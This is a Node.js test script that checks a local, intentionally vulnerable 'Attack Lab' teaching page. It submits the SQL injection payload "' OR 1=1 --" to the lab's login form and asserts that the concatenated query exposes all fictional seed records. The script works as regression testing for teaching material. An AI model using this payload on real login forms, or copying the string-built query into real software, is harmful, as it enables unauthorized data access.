// Reproducible baseline log for the intentionally vulnerable Attack Lab (issue #7).
// Usage: node scripts/attack-baseline-log.mjs http://localhost:5179
// Runs only against a LOCAL dev server and uses only the page's supplied classroom
// payload and fictional seed accounts. Prints a JSON log; exits nonzero on failure.
import assert from 'node:assert/strict';

const base = new URL(process.argv[2] ?? 'http://localhost:5179');
if (base.protocol !== 'http:' || !['localhost', '127.0.0.1', '[::1]'].includes(base.hostname)) {
  console.error('Refusing to run: only a local http dev server (localhost, 127.0.0.1 or [::1]) is allowed.');
  process.exit(2);
}

const PAYLOAD = "' OR 1=1 --";

function decode(value) {
  return value.replace(/&quot;/g, '"').replace(/&#x27;|&#39;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
}

function text(html) {
  return decode(html.replace(/<!-- -->/g, '').replace(/<[^>]+>/g, '')).trim();
}

// The hidden server-action fields of the one <form> whose action id ends with `actionName`.
async function actionForm(actionName) {
  const response = await fetch(new URL('/attack-lab', base), { redirect: 'manual' });
  assert.equal(response.status, 200, 'GET /attack-lab');
  const html = await response.text();
  const formHtml = [...html.matchAll(/<form[\s\S]*?<\/form>/g)].map((m) => m[0])
    .find((candidate) => candidate.includes(`#${actionName}`));
  assert.ok(formHtml, `no ${actionName} form on /attack-lab`);
  const form = new FormData();
  for (const [, name, value] of formHtml.matchAll(/<input type="hidden" name="([^"]+)"(?: value="([^"]*)")?\/?>/g)) {
    form.append(decode(name), decode(value ?? ''));
  }
  return form;
}

// Submit a form the way a browser without JavaScript does and read the rendered result.
async function submit(actionName, fields = {}) {
  const form = await actionForm(actionName);
  for (const [key, value] of Object.entries(fields)) form.set(key, value);
  const response = await fetch(new URL('/attack-lab', base), {
    method: 'POST', body: form, headers: { origin: base.origin }, redirect: 'manual',
  });
  assert.equal(response.status, 200, `${actionName} status`);
  const html = await response.text();
  const outputs = [...html.matchAll(/<output[^>]*>([\s\S]*?)<\/output>/g)].map((m) => m[1]);
  const query = html.match(/<code class="mt-3[^"]*">([\s\S]*?)<\/code>/);
  return {
    message: outputs.length ? text(outputs[0].replace(/<code[\s\S]*<\/code>/, '')) : null,
    query: query ? text(query[1]) : null,
    records: [...html.matchAll(/<article[\s\S]*?<h3[^>]*>([\s\S]*?)<\/h3>[\s\S]*?<span[^>]*>([\s\S]*?)<\/span>[\s\S]*?<p[^>]*>([\s\S]*?)<\/p>/g)]
      .map(([, name, role, note]) => ({ name: text(name), role: text(role), note: text(note) })),
  };
}

const steps = [];
async function step(label, action, fields, check) {
  const result = await submit(action, fields);
  check(result);
  steps.push({ step: label, input: fields, ...result });
}

await step('reset lab to its seed', 'resetLab', {}, (r) => {
  assert.equal(r.message, 'Lab data reset to the 3 fictional seed records.');
});
await step('ordinary wrong password', 'vulnerableLogin', { username: 'alex', password: 'wrong' }, (r) => {
  assert.equal(r.message, 'Login failed.');
  assert.equal(r.query, "SELECT display_name, role, private_note FROM lab_accounts WHERE username = 'alex' AND password = 'wrong'");
  assert.equal(r.records.length, 0);
});
await step('real fictional credentials', 'vulnerableLogin', { username: 'alex', password: 'falcon7' }, (r) => {
  assert.equal(r.message, 'Login bypassed. 1 fictional record exposed.');
  assert.deepEqual(r.records, [{ name: 'Alex Morgan', role: 'Finance Intern', note: 'Training record: invoice review due Friday.' }]);
});
await step('supplied classroom payload', 'vulnerableLogin', { username: PAYLOAD, password: 'anything' }, (r) => {
  assert.equal(r.message, 'Login bypassed. 3 fictional records exposed.');
  assert.equal(r.query, "SELECT display_name, role, private_note FROM lab_accounts WHERE username = '' OR 1=1 --' AND password = 'anything'");
  assert.deepEqual(r.records, [
    { name: 'Alex Morgan', role: 'Finance Intern', note: 'Training record: invoice review due Friday.' },
    { name: 'Jamie Lee', role: 'Help Desk', note: 'Training record: temporary badge 1042.' },
    { name: 'Casey Rivera', role: 'Operations', note: 'Training record: vendor meeting moved to 3 PM.' },
  ]);
});

console.log(JSON.stringify({ target: base.origin, page: '/attack-lab', checkedAt: new Date().toISOString(), steps }, null, 2));
